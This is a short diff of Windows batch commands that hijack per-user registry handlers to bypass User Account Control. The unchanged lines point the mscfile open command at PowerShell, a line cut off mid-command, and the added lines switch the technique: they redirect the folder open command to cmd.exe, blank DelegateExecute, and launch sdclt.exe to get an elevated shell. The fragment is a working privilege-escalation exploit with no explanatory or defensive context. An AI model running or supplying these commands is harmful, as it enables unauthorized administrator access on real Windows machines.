@@ -2,3 +2,7 @@ REG ADD "HKCU\Software\Classes\mscfile\Shell\Open\command" /d "powershell -nop -
 
 REG ADD "HKCU\Software\Classes\mscfile\Shell\Open\command" /v "DelegateExecute" /t REG_SZ /d "" /f
 
+REG DELETE "HKCU\Software\Classes\mscfile" /f
+REG ADD "HKCU\Software\Classes\folder\shell\open\command" /d "cmd.exe" /f
+REG ADD "HKCU\Software\Classes\folder\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f
+sdclt.exe
